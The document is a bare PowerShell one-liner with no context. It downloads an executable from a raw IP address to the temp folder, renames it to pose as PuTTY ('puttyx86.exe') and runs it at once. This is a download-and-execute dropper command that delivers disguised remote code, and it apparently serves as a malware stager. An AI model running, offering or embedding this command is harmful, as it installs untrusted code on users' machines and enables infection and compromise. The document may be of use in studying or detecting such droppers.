
(New-Object System.Net.WebClient).DownloadFile('http://185.45.193.169/update.exe',"$env:TEMP\puttyx86.exe");Start-Process ("$env:TEMP\puttyx86.exe")

